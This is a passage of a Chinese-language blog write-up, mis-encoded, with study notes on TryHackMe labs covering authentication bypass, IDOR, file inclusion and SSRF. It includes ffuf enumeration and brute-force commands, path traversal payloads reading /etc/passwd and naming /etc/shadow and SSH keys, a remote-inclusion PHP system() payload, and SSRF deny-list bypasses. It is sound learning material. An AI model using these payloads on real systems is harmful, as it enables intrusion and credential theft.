src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858085.png" alt="image-20240304185824992"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403041858894.png" alt="image-20240304185842721"></p><p>æ€»ç»“:ä¸»è¦ä»‹ç»äº†ä¸€äº›æ”¶é›†å­åŸŸçš„æ–¹æ³•</p><h3 id="Authentication-Bypass-èº«ä»½éªŒè¯ç»•è¿‡"><a href="#Authentication-Bypass-èº«ä»½éªŒè¯ç»•è¿‡" class="headerlink" title="Authentication Bypass(èº«ä»½éªŒè¯ç»•è¿‡)"></a>Authentication Bypass(èº«ä»½éªŒè¯ç»•è¿‡)</h3><p> 1.ç”¨æˆ·åæšä¸¾</p><p>éªŒè¯å“ªäº›ç”¨æˆ·åæ˜¯å·²ç»å­˜åœ¨çš„ ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å…¶å¯†ç çš„</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨ffufè¿›è¡ŒéªŒè¯ é™¤æ­¤ä¹‹å¤– æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨burpsuiteè¿›è¡ŒéªŒè¯ </p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ffuf -w &#x27;<span class="hljs-string">/home/kali/</span>æ¡Œé¢<span class="hljs-string">/yhm.txt</span>&#x27; -X POST -d <span class="hljs-string">&quot;username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u <span class="hljs-string">&quot;http://10.10.70.227/customers/signup&quot;</span> -mr <span class="hljs-string">&quot;username already exists&quot;</span><br></code></pre></td></tr></table></figure><p>-w æ˜¯æŒ‡å®šçš„å­—å…¸ ç„¶å-Xæ˜¯ä¼ å‚çš„æ–¹å¼ -dæ˜¯ä¼ å…¥çš„å†…å®¹ FUZZçš„åœ°æ–¹å°±æ˜¯å­—å…¸è¿›è¡Œçˆ†ç ´çš„åœ°æ–¹ ç„¶å-Hå°±æ˜¯æŒ‡å®šä¸€ä¸‹Content-Typeçš„ç±»å‹ -uæŒ‡å®šurl -mræ˜¯æŒ‡å®š å½“æ³¨å†Œå·²ç»å­˜åœ¨çš„ç”¨æˆ·æ—¶å‡ºç°çš„ä¸€äº›é”™è¯¯ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042153730.png" alt="image-20240304215307566"></p><p>å¥½çš„å­—å…¸å¾ˆé‡è¦</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042204727.png" alt="image-20240304220432569"></p><p>2.æš´åŠ›ç ´è§£</p><p>è¿˜æ˜¯åˆ©ç”¨çˆ†ç ´ </p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">ffuf -w <span class="hljs-string">&#x27;/home/kali/æ¡Œé¢/user.txt&#x27;</span>:<span class="hljs-keyword">W</span><span class="hljs-number">1</span>,<span class="hljs-string">&#x27;/home/kali/æ¡Œé¢/password.txt&#x27;</span>:<span class="hljs-keyword">W</span><span class="hljs-number">2</span> -<span class="hljs-keyword">X</span> POST -d <span class="hljs-string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u <span class="hljs-string">&quot;http://10.10.70.227/customers/login&quot;</span> -fc <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>fc 200 æ˜¯åªè¿”å›å“åº”åŒ…ä¸º200çš„</p><p>3.é€»è¾‘ç¼ºé™·</p><p>æœ‰æ—¶èº«ä»½éªŒè¯è¿‡ç¨‹åŒ…å«é€»è¾‘ç¼ºé™·ã€‚é€»è¾‘ç¼ºé™·æ˜¯æŒ‡åº”ç”¨ç¨‹åºçš„å…¸å‹é€»è¾‘è·¯å¾„è¢«é»‘å®¢ç»•è¿‡ã€è§„é¿æˆ–æ“çºµã€‚é€»è¾‘ç¼ºé™·å¯èƒ½å­˜åœ¨äºç½‘ç«™çš„ä»»ä½•åŒºåŸŸï¼Œä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä¸“æ³¨äºä¸èº«ä»½éªŒè¯ç›¸å…³çš„ç¤ºä¾‹ã€‚</p><p>æ¯”å¦‚:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( url.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;/admin&#x27;</span>) &#123;<br>    <span class="hljs-comment"># Code to check user is an admin</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment"># View Page</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥ä»£ç çš„åŠŸèƒ½æ˜¯ æ£€æŸ¥è®¿é—®è·¯å¾„æ˜¯å¦ä»¥adminå¼€å¤´ å¦‚æœæ˜¯çš„è¯å°±æ£€æŸ¥ç”¨æˆ·æ˜¯ä¸æ˜¯admin å¦åˆ™çš„è¯å°±æ˜¾ç¤ºå…¶ä»–çš„</p><p>ç„¶è€Œå½“æˆ‘ä»¬è®¿é—®/adMinæ—¶å°±ä¼šç»•è¿‡è¯¥æ£€æŸ¥ ä»è€Œé€ æˆä¸€ä¸ªé€»è¾‘ç¼ºé™·</p><p> æœ€åå°±æ˜¯thmçš„è¿™ä¸ªé€»è¾‘ç¼ºé™·çš„åˆ©ç”¨äº† </p><p>é¦–å…ˆæˆ‘ä»¬å…ˆåˆ°é—å¿˜å¯†ç é‚£é‡Œï¼Œç„¶åå®ƒè®©è¾“å…¥ä¸ä¹‹å…³è”çš„é‚®ç®±åœ°å€ è¿™é‡Œthmç»™äº†ä¸€ä¸ª ç„¶åæ¥ç€åˆè®©æˆ‘ä»¬è¾“å…¥ç”¨æˆ·å æœ€åå®ƒä¼šæŠŠå¯†ç å‘é€åˆ°ä¹‹å‰çš„é‚®ç®±é‡Œé¢å»</p><p>å› ä¸ºå‘é€emailä½¿ç”¨çš„æ˜¯getä¼ å‚ è€Œå‘é€usernameæ˜¯postä¼ å‚ è¿™é‡Œæˆ‘ä»¬éƒ½æ”¹æˆrequestä¼ å‚ æ­¤æ—¶å®ƒä¼šåå‘äºpostçš„ä¼ å…¥å€¼ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨posté‚£é‡Œä¼ å…¥emailçš„å€¼ ä»è€Œå¯ä»¥æ§åˆ¶emailçš„å‘é€åœ°å€</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042336559.png" alt="image-20240304233657364"></p><p>æ ¹æ®è¿™ä¸ªæ€è·¯ æˆ‘ä»¬å…ˆå»ç½‘ç«™æ³¨å†Œä¸€ä¸ªè´¦å· ç„¶åæŠŠemialåœ°å€æ”¹ä¸ºæˆ‘ä»¬æ³¨å†Œçš„å€¼ (å¯ä»¥åœ¨bpå‘é€)</p><p>ç„¶åæˆ‘ä»¬åœ¨æ³¨å†Œçš„ç•Œé¢ç­‰å¾…</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042349941.png" alt="image-20240304234947866"></p><p>ä¼šæœ‰ä¸€ä¸ªå¯†ç ä¿®æ”¹çš„æç¤º æœ‰ä¸€ä¸ªç™»å½•çš„é“¾æ¥ ç„¶åç™»å½•å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403042351063.png" alt="image-20240304235146873"></p><p>4.é€šè¿‡cookieè¿›è¡Œç™»å½•ç»•è¿‡</p><p>å­˜æ”¾hashçš„æ•°æ®åº“çš„ç›¸å…³ç½‘ç«™:<a href="https://crackstation.net/">CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.</a></p><p>æœ‰çš„æ—¶å€™cookieé‚£é‡Œä¼šå­˜æ”¾ä¸€äº›hashçš„å€¼ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥å»ä¸Šé¢çš„ç½‘ç«™ä¸Šå¯»æ‰¾ä¸€ä¸‹ çœ‹æ˜¯å¦èƒ½å¤Ÿè§£å‡ºæ¥</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052037397.png" alt="image-20240305203727159"></p><p>æ€»ç»“ï¼šä»‹ç»äº†å‡ ç§ç»•è¿‡èº«ä»½éªŒè¯çš„æ–¹æ³•</p><h3 id="IDOR-è¶Šæƒ"><a href="#IDOR-è¶Šæƒ" class="headerlink" title="IDOR (è¶Šæƒ)"></a>IDOR (è¶Šæƒ)</h3><p>æ˜¯ä¸€ä¸ªæœªç»æˆæƒè®¿é—®çš„æ¼æ´</p><p> æœ‰çš„æ—¶å€™æˆ‘ä»¬åœ¨æŸ¥çœ‹ä¸ªäººä¿¡æ¯çš„æ—¶å€™ å¦‚æœä¸Šæ–¹çš„urlåœ°å€ä¸­æœ‰id=xxxï¼ˆxxxä¸ºæ•°å­—ï¼‰çš„è¯ å¦‚æœæ›´æ”¹æ•°å­—çš„ä¿¡æ¯ä¼šå‡ºç°ä»–äººçš„ä¿¡æ¯çš„è¯ é‚£ä¹ˆå°±æ˜¯ä¸€ä¸ªidoræ¼æ´</p><p>ä¸Šé¢åªæ˜¯æœ€ç›´æ¥çš„ ä¸‹é¢æ˜¯ä¸€äº›å˜å½¢</p><ol><li>åœ¨ç¼–ç çš„IDä¸­æŸ¥æ‰¾IDOR</li></ol><p>æœ‰çš„æ—¶å€™æ˜¯åŸºäºbase64è¿›è¡Œç¼–ç çš„ ç„¶åæˆ‘ä»¬å…ˆè§£ç  å°†idåé¢çš„æ•°å­—è¿›è¡Œä¸€ä¸ªä¿®æ”¹ æ¥ç€è¿›è¡Œç¼–ç åå†å‘é€åˆ°webæœåŠ¡å™¨ä¸­ æŸ¥çœ‹ä¿¡æ¯æ˜¯å¦å‘ç”Ÿå˜åŒ–</p><p>2.åœ¨å“ˆå¸ŒIDä¸­æŸ¥æ‰¾IDOR</p><p>åŒç† ä¸å†è§£é‡Š</p><p>3.åœ¨ä¸å¯é¢„æµ‹çš„ ID ä¸­æŸ¥æ‰¾ IDOR</p><p>å¦‚æœ ä½¿ç”¨ä¸Šè¿°æ–¹æ³•æ— æ³•æ£€æµ‹åˆ° Idï¼Œè¿™æ˜¯ä¸€ç§æå¥½çš„æ–¹æ³• çš„IDORæ£€æµ‹æ˜¯åˆ›å»ºä¸¤ä¸ªå¸æˆ·å¹¶äº¤æ¢IDå· åœ¨ä»–ä»¬ä¹‹é—´ã€‚å¦‚æœæ‚¨å¯ä»¥ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„ ID æŸ¥çœ‹å…¶å†…å®¹ æ•°å­—ï¼ŒåŒæ—¶ä»ç„¶ä½¿ç”¨å…¶ä»–å¸æˆ·ç™»å½•ï¼ˆæˆ–ä¸ç™»å½• å·²ç™»å½•ï¼‰ï¼Œæ‚¨å‘ç°äº†ä¸€ä¸ªæœ‰æ•ˆçš„ IDOR æ¼æ´ã€‚</p><p>å®ä¾‹</p><p>æˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªè´¦å· ç„¶ååœ¨ç½‘ç»œé‚£é‡Œè¿›è¡ŒæŸ¥çœ‹</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052120774.png" alt="image-20240305212022659"></p><p>å¯ä»¥çœ‹åˆ°å®ƒæ˜¯å°†ç”¨æˆ·ä¿¡æ¯ä»¥jsonçš„å½¢å¼è¿”å›çš„</p><p>ç„¶åæˆ‘ä»¬æ›´æ”¹idçš„ä¿¡æ¯ å¯ä»¥çœ‹åˆ°å…¶ä»–ç”¨æˆ·çš„ç”¨æˆ·åå’Œé‚®ç®±</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052122057.png" alt="image-20240305212250867"></p><p>æ€»ç»“ï¼šè¿™ä¸ªæˆ¿é—´ä»‹ç»äº†å…³äºIDORæ¼æ´çš„åˆ©ç”¨</p><h3 id="File-Inclusion-æ–‡ä»¶åŒ…å«"><a href="#File-Inclusion-æ–‡ä»¶åŒ…å«" class="headerlink" title="File Inclusion (æ–‡ä»¶åŒ…å«)"></a>File Inclusion (æ–‡ä»¶åŒ…å«)</h3><p>æ–‡ä»¶åŒ…å«äº§ç”Ÿçš„åŸå› :æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥äº§ç”Ÿä¸€ä¸ªä¸¥æ ¼çš„æ§åˆ¶ å¯¼è‡´è¾“å…¥åœ¨å…·æœ‰æ–‡ä»¶åŒ…å«åŠŸèƒ½å‡½æ•°çš„åœ°æ–¹äº§ç”Ÿæ¼æ´</p><p>1.è·¯å¾„éå†</p><p>é€šå¸¸æ˜¯è¯»å–æœåŠ¡å™¨ä¸Šçš„ä¸€äº›æ–‡ä»¶</p><p>å½“ç”¨æˆ·çš„è¾“å…¥ä¼ é€’ç»™ PHP ä¸­çš„ file_get_contents ç­‰å‡½æ•°æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè·¯å¾„éå†æ¼æ´ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯¥å‡½æ•°ä¸æ˜¯å¯¼è‡´è¯¥æ¼æ´çš„ä¸»è¦å› ç´ ã€‚é€šå¸¸ï¼Œè¾ƒå·®çš„è¾“å…¥éªŒè¯æˆ–ç­›é€‰æ˜¯å¯¼è‡´æ¼æ´çš„åŸå› ã€‚ åœ¨ PHP ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨file_get_contentsæ¥è¯»å–æ–‡ä»¶çš„å†…å®¹</p><p>å¯ä»¥é€šè¿‡../../../../../../ç›®å½•éå†æ¥è¯»å–æˆ‘ä»¬æƒ³è¦è¯»å–çš„å†…å®¹</p><p>ä¸è¿‡æœ‰çš„æ—¶å€™ä¼šå¢åŠ ä¸€äº›è¿‡æ»¤å™¨ æ¥é˜²æ­¢è¯»å–ç›¸å…³çš„æ–‡ä»¶</p><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„ </p><table><thead><tr><th>ä½ç½®</th><th>æè¿°</th></tr></thead><tbody><tr><td>/etc/issue</td><td>åŒ…å«è¦åœ¨ç™»å½•æç¤ºä¹‹å‰æ‰“å°çš„æ¶ˆæ¯æˆ–ç³»ç»Ÿæ ‡è¯†ã€‚</td></tr><tr><td>/etc/profile</td><td>æ§åˆ¶ç³»ç»ŸèŒƒå›´çš„é»˜è®¤å˜é‡ï¼Œä¾‹å¦‚å¯¼å‡ºå˜é‡ã€æ–‡ä»¶åˆ›å»ºæ©ç  ï¼ˆumaskï¼‰ã€ç»ˆç«¯ç±»å‹ã€é‚®ä»¶æ¶ˆæ¯ï¼Œä»¥æŒ‡ç¤ºæ–°é‚®ä»¶ä½•æ—¶åˆ°è¾¾</td></tr><tr><td>/proc/version</td><td>æŒ‡å®š Linux å†…æ ¸çš„ç‰ˆæœ¬</td></tr><tr><td>/etc/passwd</td><td>æ‹¥æœ‰æœ‰æƒè®¿é—®ç³»ç»Ÿçš„æ‰€æœ‰æ³¨å†Œç”¨æˆ·</td></tr><tr><td>/etc/shadow</td><td>åŒ…å«æœ‰å…³ç³»ç»Ÿç”¨æˆ·å¯†ç çš„ä¿¡æ¯</td></tr><tr><td>/root/.bash_history</td><td>åŒ…å« root ç”¨æˆ·çš„å†å²è®°å½•å‘½ä»¤</td></tr><tr><td>/var/log/dmessage</td><td>åŒ…å«å…¨å±€ç³»ç»Ÿæ¶ˆæ¯ï¼ŒåŒ…æ‹¬ç³»ç»Ÿå¯åŠ¨æœŸé—´è®°å½•çš„æ¶ˆæ¯</td></tr><tr><td>/var/mail/root</td><td>root ç”¨æˆ·çš„æ‰€æœ‰ç”µå­é‚®ä»¶</td></tr><tr><td>/root/.ssh/id_rsa</td><td>æœåŠ¡å™¨ä¸Š root ç”¨æˆ·æˆ–ä»»ä½•å·²çŸ¥æœ‰æ•ˆç”¨æˆ·çš„ç§æœ‰ SSH å¯†é’¥</td></tr><tr><td>/var/log/apache2/access.log</td><td>å¯¹ Apache Web æœåŠ¡å™¨çš„è®¿é—®è¯·æ±‚</td></tr><tr><td>C:\boot.ini</td><td>åŒ…å«å¸¦æœ‰ BIOS å›ºä»¶çš„è®¡ç®—æœºçš„å¯åŠ¨é€‰é¡¹</td></tr></tbody></table><p>2.æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI)</p><p>ä¸ä¹‹ç›¸å…³çš„å‡½æ•° include require include_once require_once </p><p>thmç»™çš„æ¼”ç¤ºæ˜¯ç”¨phpæ¥çš„ ç„¶åè¿˜æœ‰å…¶ä»–ç¼–ç¨‹è¯­è¨€çš„LFI</p><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬æ˜¯è¿›è¡Œé»‘ç›’æµ‹è¯•çš„ å¹¶æ²¡æœ‰æºç  ç„¶åæˆ‘ä»¬å°±å¯ä»¥è§‚å¯Ÿé”™è¯¯ä¿¡æ¯ æ¥ä»¥æ­¤è·å–ç›¸å…³ä¿¡æ¯</p><p>åœ¨php5.3.4ç‰ˆæœ¬ä»¥ä¸‹ å½“includeå‡½æ•°æ˜¯(include â€œâ€.php) åé¢è‡ªåŠ¨æ·»åŠ .phpæ—¶ è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨%00æ¥ç»•è¿‡ å³../../../../etc/passwd%00 è¿™ä¸ªæ—¶å€™å°±èƒ½è¯»å–/etc/passwdäº†.</p><p>è¿˜æœ‰çš„å°±æ˜¯æŠŠ../ç»™ç¦æ­¢äº† ç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨åŒå±‚çš„ç»•è¿‡ å³ â€¦.//â€¦.//â€¦.// è¿™ç§ç±»å‹çš„ç»•è¿‡</p><p>åŸå› å¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052303260.png" alt="image-20240305230323091"></p><p>3.è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI)</p><p>ä½¿ç”¨å‰ææ˜¯ allow_url_fopen æ‰“å¼€</p><p>æˆ‘ä»¬å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šé¢éƒ¨ç½²æ¶æ„æ–‡ä»¶ ç„¶ååŒ…å«åˆ°æœåŠ¡ç«¯ å³å¯è§¦å‘æ¼æ´ åŸå› åŒæ ·æ˜¯å¯¹ç”¨æˆ·çš„è¾“å…¥æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ è¿™ä¸ªè¿œç¨‹åŒ…å«çš„å±å®³æ¯”è¾ƒå¤§ä¸€ç‚¹</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b0c2659127d95a0b633e94bd00ed10e0.png" alt="img"></p><p>ä¸‹é¢æ˜¯ä¸€äº›ä¿®å¤çš„æ–¹æ³•:</p><p>1.æŠŠä¸€äº›å±é™©çš„å‡½æ•°ç»™ç¦æ­¢</p><p>2.æŠŠæŠ¥é”™ä¿¡æ¯ç»™å…³é—­</p><p>3.ä½¿ç”¨ç™½åå•</p><p>4.å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ éƒ¨ç½²waf</p><p>5.ä½¿ç”¨æ–°çš„æœåŠ¡ é˜²æ­¢ä¸€äº›è€ç‰ˆæœ¬çš„æ¼æ´</p><p>LFIæµ‹è¯•æ­¥éª¤</p><ol><li>æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥é€šè¿‡ GETã€POSTã€COOKIE æˆ– HTTP æ ‡å¤´å€¼çš„å…¥å£ç‚¹ï¼</li><li>è¾“å…¥æœ‰æ•ˆçš„è¾“å…¥ä»¥æŸ¥çœ‹ Web æœåŠ¡å™¨çš„è¡Œä¸ºæ–¹å¼ã€‚</li><li>è¾“å…¥æ— æ•ˆçš„è¾“å…¥ï¼ŒåŒ…æ‹¬ç‰¹æ®Šå­—ç¬¦å’Œå¸¸ç”¨æ–‡ä»¶åã€‚</li><li>ä¸è¦æ€»æ˜¯ç›¸ä¿¡æ‚¨åœ¨è¾“å…¥è¡¨å•ä¸­æä¾›çš„å†…å®¹æ˜¯æ‚¨æƒ³è¦çš„ï¼ä½¿ç”¨æµè§ˆå™¨åœ°å€æ æˆ– Burpsuite ç­‰å·¥å…·ã€‚</li><li>åœ¨è¾“å…¥æ— æ•ˆè¾“å…¥æ—¶æŸ¥æ‰¾é”™è¯¯ï¼Œä»¥æ˜¾ç¤º Web åº”ç”¨ç¨‹åºçš„å½“å‰è·¯å¾„;å¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œé‚£ä¹ˆè¯•é”™å¯èƒ½æ˜¯æ‚¨çš„æœ€ä½³é€‰æ‹©ã€‚</li><li>äº†è§£è¾“å…¥éªŒè¯ä»¥åŠæ˜¯å¦æœ‰ä»»ä½•è¿‡æ»¤å™¨ï¼</li><li>å°è¯•æ³¨å…¥æœ‰æ•ˆæ¡ç›®ä»¥è¯»å–æ•æ„Ÿæ–‡ä»¶</li></ol><p>æŒ‘æˆ˜:</p><p>flag1:</p><p>æ¢æˆpostè¿›è¡Œä¼ å‚å³å¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052342400.png" alt="image-20240305234238278"></p><p>flag2:</p><p>è¿™ä¸ªæ–‡ä»¶åŒ…å«ç‚¹åœ¨é‚£ä¸ªcookieé‚£é‡Œ ç„¶ååé¢éœ€è¦ç”¨%00æŠŠ.phpåç¼€ç»™è¿‡æ»¤æ‰</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052345553.png" alt="image-20240305234534377"></p><p>flag3:</p><p>è¿™ä¸€é—®æˆ‘æ˜¯è¯•äº†æœ‰ä¸€ä¼š å…ˆè§‚å¯ŸæŠ¥é”™ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403052359232.png" alt="image-20240305235913020"></p><p>å·®ä¸å¤šæ˜¯æŠŠä¸Šé¢çš„ç»™ç»“åˆèµ·æ¥äº†</p><p>ç„¶åæˆ‘åœ¨getä¼ å‚é‚£é‡Œç”¨çš„â€¦.//â€¦.//â€¦.//â€¦.//etc/passwd%00 æ²¡è¿‡å» åæ¥æ¢äº†ä¼ å‚æ–¹å¼æ‰å¯ä»¥çš„  è¿™é‡Œçš„è¯æˆ‘è§‰å¾—æ˜¯å› ä¸ºå®ƒæ˜¯ç”¨$_REQUESTS æ¥å—httpçš„ ç„¶åpostä¼ å…¥ç›¸åŒçš„å€¼æ—¶ postä¼šæŠŠgetçš„ç»™è¦†ç›–æ‰ (æ›´åå‘äºpost)</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403060000247.png" alt="image-20240306000037116"></p><p>ç„¶åå‰©ä¸‹çš„è¿™ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å« å†™ä¸ªä¸€å¥è¯ ç„¶åè¿æ¥åˆ°ç½‘ç«™ä¸Šé¢ è®©å…¶åŒ…å«å°±è¡Œäº†</p><p>æ¥è¯´ä¸€ä¸‹å…·ä½“çš„æ­¥éª¤ é¦–å…ˆ æˆ‘ä»¬åœ¨è¦å…±äº«æ–‡ä»¶çš„ç›®å½•ä¸‹å¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p><p>python3 -m http.server</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061322574.png" alt="image-20240306132215417"></p><p>ç„¶åå†å¯¹åº”çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtxtæ–‡ä»¶(phpæ–‡ä»¶ä¹Ÿå¯ä»¥) é‡Œé¢å†™å…¥ <?php echo system('hostname');?></p><p>ç„¶åå†å»è¿›è¡Œä¸€ä¸ªæ–‡ä»¶åŒ…å«</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061323942.png" alt="image-20240306132358783"></p><p>æ€»ç»“:ä»‹ç»äº†æ–‡ä»¶åŒ…å«çš„ä¸€äº›å†…å®¹ ä»¥åŠä¸€äº›ç®€å•çš„ç»•è¿‡æ–¹æ³•</p><h3 id="Intro-to-SSRF-SSRFæ¼æ´"><a href="#Intro-to-SSRF-SSRFæ¼æ´" class="headerlink" title="Intro to SSRF(SSRFæ¼æ´)"></a>Intro to SSRF(SSRFæ¼æ´)</h3><p>ssrfæ˜¯æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  å…è®¸æ¶æ„ç”¨æˆ·å¯¼è‡´WebæœåŠ¡å™¨å‘æ”»å‡»è€…é€‰æ‹©çš„èµ„æºå‘å‡ºé¢å¤–æˆ–ç¼–è¾‘çš„HTTPè¯·æ±‚ã€‚ åˆ†ä¸ºä¸¤ç±» ä¸€ç§æ˜¯æœ‰å›æ˜¾çš„ssrf ä¸€ç§æ˜¯æ²¡å›æ˜¾çš„ssrf</p><p>é€ æˆçš„å±é™©:</p><p>1.æ¢æµ‹å†…ç½‘</p><p>2.è¿›å…¥æœªæˆæƒçš„åŒºåŸŸ</p><p>3.è®¿é—®å®¢æˆ·/ç»„ç»‡æ•°æ®</p><p>4.æ˜¾ç¤ºèº«ä»½éªŒè¯ä»¤ç‰Œ/å‡­æ®</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061350512.png" alt="image-20240306135047331"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403061728058.png" alt="image-20240306172822996"></p><p>åŸå› æ˜¯æœåŠ¡ç«¯é‡è§äº†&amp; å¯èƒ½ä¼šé€ æˆä¸€ä¸ªè§£æé”™è¯¯ ä¼šè¯¯è®¤ä¸ºåˆ°è¿™é‡Œå°±ç»“æŸäº† ç„¶ååé¢çš„urlå°±æ²¡æœ‰ç”¨äº†</p><p>1.æŸ¥æ‰¾ssrf</p><p>ä¸‹é¢æ˜¯å¸¸è§ssrfçš„ç¤ºä¾‹:</p><p><strong>åœ¨åœ°å€æ çš„å‚æ•°ä¸­ä½¿ç”¨å®Œæ•´ URL æ—¶ï¼š</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png" alt="img"></p><p><strong>è¡¨å•ä¸­çš„éšè—å­—æ®µï¼š</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png" alt="img"></p><p><strong>éƒ¨åˆ† URLï¼Œä¾‹å¦‚ä¸»æœºåï¼š</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png" alt="img"></p><p><strong>æˆ–è€…å¯èƒ½åªæ˜¯ URL çš„è·¯å¾„ï¼š</strong></p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png" alt="img"></p><p>å¯¹äºé‚£äº›æ— å›æ˜¾çš„sssrfæ¥è¯´ å¯ä»¥ä½¿ç”¨requestbin.com æ¥æ˜¾ç¤ºè¿”å›çš„ç»“æœ(æ„Ÿè§‰å°±æ˜¯ä¸€ä¸ªdnså¤–å¸¦çš„)    æˆ–è€…æ˜¯åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šé¢æ˜¾ç¤º</p><p>2.ç»•è¿‡</p><p>æ‹’ç»åˆ—è¡¨:</p><p>å¯¹äºé‚£äº›localhost (127.0.0.1)çš„ç»•è¿‡ é€šå¸¸å¯ä»¥ä½¿ç”¨ç‰¹æ®Šæ•°å­—æ¥è¿›è¡Œç»•è¿‡ </p><p>ï¼ˆå¦‚ 0ã€0.0.0.0ã€0000ã€127.1ã€127.<em>.</em>.*ã€2130706433ã€017700000001ï¼‰æˆ–å…·æœ‰è§£æä¸º IP åœ°å€ 127.0.0.1 çš„ DNS è®°å½•ï¼ˆå¦‚ 127.0.0.1.nip.ioï¼‰çš„å­åŸŸæ¥ç»•è¿‡æ‹’ç»åˆ—è¡¨ã€‚</p><p>æ­¤å¤–ï¼Œåœ¨äº‘ç¯å¢ƒä¸­ï¼Œé˜»æ­¢å¯¹ IP åœ°å€ 169.254.169.254 çš„è®¿é—®å°†æ˜¯æœ‰ç›Šçš„ï¼Œè¯¥åœ°å€åŒ…å«å·²éƒ¨ç½²äº‘æœåŠ¡å™¨çš„å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬å¯èƒ½çš„æ•æ„Ÿä¿¡æ¯ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨è‡ªå·±çš„åŸŸä¸Šæ³¨å†Œä¸€ä¸ªå­åŸŸï¼Œå¹¶ä½¿ç”¨æŒ‡å‘ IP åœ°å€ 169.254.169.254 çš„ DNS 